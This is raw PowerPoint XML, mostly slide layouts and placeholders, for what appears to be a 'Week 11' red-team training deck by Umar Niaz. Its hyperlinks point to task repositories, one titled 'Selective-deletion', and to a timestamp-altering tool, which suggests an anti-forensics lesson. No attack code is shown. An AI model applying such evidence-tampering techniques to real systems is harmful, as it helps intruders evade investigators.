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33" r:id="rId3"/>
    <p:sldId id="334" r:id="rId4"/>
    <p:sldId id="257" r:id="rId5"/>
    <p:sldId id="258" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="276" r:id="rId8"/>
    <p:sldId id="275" r:id="rId9"/>
    <p:sldId id="277" r:id="rId10"/>
    <p:sldId id="278" r:id="rId11"/>
    <p:sldId id="292" r:id="rId12"/>
    <p:sldId id="306" r:id="rId13"/>
    <p:sldId id="279" r:id="rId14"/>
    <p:sldId id="307" r:id="rId15"/>
    <p:sldId id="280" r:id="rId16"/>
    <p:sldId id="336" r:id="rId17"/>
    <p:sldId id="308" r:id="rId18"/>
    <p:sldId id="281" r:id="rId19"/>
    <p:sldId id="284" r:id="rId20"/>
    <p:sldId id="282" r:id="rId21"/>
    <p:sldId id="283" r:id="rId22"/>
    <p:sldId id="285" r:id="rId23"/>
    <p:sldId id="286" r:id="rId24"/>
    <p:sldId id="287" r:id="rId25"/>
    <p:sldId id="340" r:id="rId26"/>
    <p:sldId id="288" r:id="rId27"/>
    <p:sldId id="290" r:id="rId28"/>
    <p:sldId id="291" r:id="rId29"/>
    <p:sldId id="293" r:id="rId30"/>
    <p:sldId id="294" r:id="rId31"/>
    <p:sldId id="337" r:id="rId32"/>
    <p:sldId id="299" r:id="rId33"/>
    <p:sldId id="301" r:id="rId34"/>
    <p:sldId id="302" r:id="rId35"/>
    <p:sldId id="303" r:id="rId36"/>
    <p:sldId id="304" r:id="rId37"/>
    <p:sldId id="309" r:id="rId38"/>
    <p:sldId id="310" r:id="rId39"/>
    <p:sldId id="311" r:id="rId40"/>
    <p:sldId id="312" r:id="rId41"/>
    <p:sldId id="313" r:id="rId42"/>
    <p:sldId id="314" r:id="rId43"/>
    <p:sldId id="315" r:id="rId44"/>
    <p:sldId id="338" r:id="rId45"/>
    <p:sldId id="316" r:id="rId46"/>
    <p:sldId id="317" r:id="rId47"/>
    <p:sldId id="318" r:id="rId48"/>
    <p:sldId id="319" r:id="rId49"/>
    <p:sldId id="320" r:id="rId50"/>
    <p:sldId id="339" r:id="rId51"/>
    <p:sldId id="321" r:id="rId52"/>
    <p:sldId id="322" r:id="rId53"/>
    <p:sldId id="323" r:id="rId54"/>
    <p:sldId id="324" r:id="rId55"/>
    <p:sldId id="325" r:id="rId56"/>
    <p:sldId id="326" r:id="rId57"/>
    <p:sldId id="327" r:id="rId58"/>
    <p:sldId id="331" r:id="rId59"/>
    <p:sldId id="297" r:id="rId60"/>
    <p:sldId id="298"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7AE9"/>
    <a:srgbClr val="005D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4" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="100" d="100"/>
          <a:sy n="100" d="100"/>
        </p:scale>
        <p:origin x="72" y="-7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DD21A-745A-B494-8257-CEC36AC33A3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13B6704-6F30-5BB7-8BEE-5A6FC75339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68655A5-C21E-D465-E11D-7B1514B51B79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9808CE6-1C7A-D4C8-A6F4-2BE6A80BDA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909466-6349-534B-299C-549986005DD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3507618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D1C48-D1D2-AB73-8AFA-C8DDBCE67CD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7F42C46-82CF-84BC-88B6-264FDB999B6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7436FD-8728-F260-5D96-8006C7093348}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{809992C2-5354-7898-9DD4-7FE2903C66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3A16A2-4653-70AC-2F58-64B9368F3A38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12575446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B53D3-DE92-AF21-0BD6-CF9AECC24F1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00D9DED-8004-1916-4095-AEC93CF7870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88BA394-0B2D-9404-DA39-D7580DD6BEFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2714AEFA-0E2C-F303-DC11-C5277C0CE0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DAFBD5-6545-D504-507C-65B8C5B386E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37454551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692CE-54C7-DBE6-AB32-8578240A90C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647D593-4157-35CA-5D23-D2E7F955A3C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A3171DB-8215-7909-FD22-F9175946488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708B816-FE47-0619-DBCB-2448CD9202C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FBADDDB-C924-B779-9D7A-FB7F64CCD9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864A07-1844-F9AD-00BC-4E3C0C64491E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28468210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E6089-227F-1488-4BAB-E01BD503D39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A2CD147-6B51-1E49-D65E-FF00D8DE10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AF5D38-10F4-2BE5-6841-50676979533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8D62CF3-C27C-3785-FC84-6CD2CE9352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B8A72C-172C-D482-1BAE-793FB6537E5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AEFEFC5-A4C1-7413-FFCE-2EC93A7339CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0688735B-29C1-5A6A-D469-07095EE030F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7D6F342-BC8C-8DB6-FB23-54749300B9E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30885132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AF04E-7F53-37F4-5A6F-188AB1F2D90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8E5B771-5B00-57CB-E812-8EF61A2B2006}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{246B839E-BAC8-7D33-EFB8-9F248CF754B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6D7ABA9-C588-FC93-0F78-23E0F0DE395F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13510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5CE2A86-E52E-F4F9-3BB5-BEAE0AC4A490}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22D143C5-7955-B9DF-8CFF-E7F5E8C6471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9918FAE-D321-86E6-053D-2B84A8187A94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21759086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FDD59-0503-BCFB-26EA-C6A5FC6DD0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2B29ACA-E525-1B02-1279-A502A58EA15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9BE56AB-8D55-22E8-D329-F5055EAFF3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60F98C-B7D5-42E8-0DD0-918E6603B0A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58EC5715-515A-D315-407D-70E9BA31A9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65F9A9-565D-6DB9-A01A-9AE065881261}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4272097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89025-18C7-CECA-AA4D-EF058041FA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5F1BDE2-C5B3-1973-8CFB-3BA3FE1FA27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A0FD09F-38C8-7F84-CC0D-6F9D47F52D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D9669D-461E-D381-06A3-E491A4DA160E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10BD7806-550B-CA30-E0E3-0E350AD59B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00E62D-F6C6-50FA-1DE6-C1A3881FF5A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41008297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64B68-4640-2707-7D49-B91BF1F8459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EB0157C-9CE7-623F-A612-152EBFF848D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8F00CD-81EB-0595-2FD9-26B74748D726}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EBA2DC88-0161-42D9-5CF2-3D417B999A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D1785F-5E07-3C07-ACFF-BC4F322E0B5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14448425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3C978BA-D381-2EE8-A5CC-DC5F8ACDC49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AA494DD-6AFE-742E-EDB1-240A8DDE177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104356-9B87-467B-B52B-1464E04157CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{EB2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15C59240-68B5-1B52-2954-239A1E5A30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4B4140-4CBA-D146-FF23-26DAFB1ED363}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{85A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30353232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2776C6-EB4E-9047-666F-BC2465E266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13BA3A9-FB9B-12D8-6D11-B82FF3619E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655173-6E8A-E18D-9624-7FDBCBBF9E4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B2C6834-86EF-426D-9D76-620B69720301}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8/29/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8759DEF-1037-9598-253B-41DE4ECAA1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FD986FF-7F03-D475-EA70-26F9039ACF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5A31C4B-0520-4F94-BEB2-C312241D7B8F}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33735865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github.com/umarniazafrid/Week-11-Task-1-Part-2-Selective-deletion/tree/main"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live.sysinternals.com/SetMace.exe"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github.com/umarniazafrid/Week-11-Task-2-Part-1-/tree/main"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github.com/umarniazafrid/Week-11-Task-2-Part-3/tree/main"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github.com/umarniazafrid/Week-11-Task-2-Part-3-step-8" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/umarniazafrid/Week-11-Task-2-Part-3-step-7/tree/main"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https://github.com/umarniazafrid/Week-11-Task-3-Part-2-Step-2-"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hyperlink" Target="https://github.com/umarniazafrid/Week-11-Task-3-Part-3-step-2/tree/main"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hyperlink" Target="https://github.com/umarniazafrid/Week-11-Task-3-Part-3-step-3/tree/main"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33224-220F-0E2B-60B9-EBDE942853E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WEEK 11</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{716E5992-B571-B6F3-042A-B311FABD3AC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="3660095"/>
            <a:ext cx="9144000" cy="1655762"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prepared by Umar Niaz</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Red Team Lead at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cyberster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
